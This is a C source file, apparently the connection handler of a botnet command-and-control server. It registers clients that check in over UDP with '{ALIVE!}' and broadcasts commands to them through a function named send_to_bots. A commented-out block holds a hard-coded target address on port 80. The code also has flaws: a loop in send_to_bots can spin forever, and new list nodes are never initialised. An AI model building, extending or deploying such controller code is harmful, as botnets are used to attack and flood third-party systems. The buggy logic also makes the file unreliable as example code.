#include "conn_handler.h"

extern CONNS cons;
//extern int main_sock;
extern char STOPFLAG;
extern short port;

int make_socket(void)
{
	int s;
	if((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == ERROR)	{
		perror("Failed to create socket");
		exit(1);
	}
	return s;
}

void *accept_handler(void)
{
	struct connections *connects = &cons;
	char temp[10];
	struct timeval timeout={4,0};
	
	while(1){
		int addrlen = sizeof(struct sockaddr);
		connects->sock = make_socket();
		struct sockaddr_in serverAddr;
		bind_socket(connects->sock, &serverAddr);

		setsockopt(connects->sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
		
		printf("socket: %d\n", connects->sock);
		if(recvfrom(connects->sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
			if(strncmp(temp, "{ALIVE!}", 8) != 0)
				continue;

			sendto(connects->sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
			connects->next = (struct connections *) malloc(sizeof (struct connections));
			connects = connects->next;
		}else{
			if(STOPFLAG){
				pthread_exit(0);
			}else{
				close(connects->sock);
			}

		}
	}
}

void send_to_bots(char *data)
{
	struct connections *connects = &cons;
	while(connects != NULL){
		int len = strlen(data)+1;
		len < 60 ? len = 60: 0 ;
		if((connects->sock)==0)
			continue;
		int ret = sendto(connects->sock, data, len, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr));
		// DEBUG
		printf("%d\n", ret);
		connects = connects->next;
	}
}

void bind_socket(int sock, struct sockaddr_in *serverAddr)
{
	memset(serverAddr, 0, sizeof(struct sockaddr_in));
	serverAddr->sin_family = AF_INET;
	serverAddr->sin_port = htons(port);
	serverAddr->sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(sock, (struct sockaddr *)serverAddr, sizeof(struct sockaddr)) == ERROR){
		perror("Failed to bind the Socket");
		exit(1);
	}
}

/*
server.sin_addr.s_addr = inet_addr("74.125.235.20");
    server.sin_family = AF_INET;
    server.sin_port = htons( 80 );
*/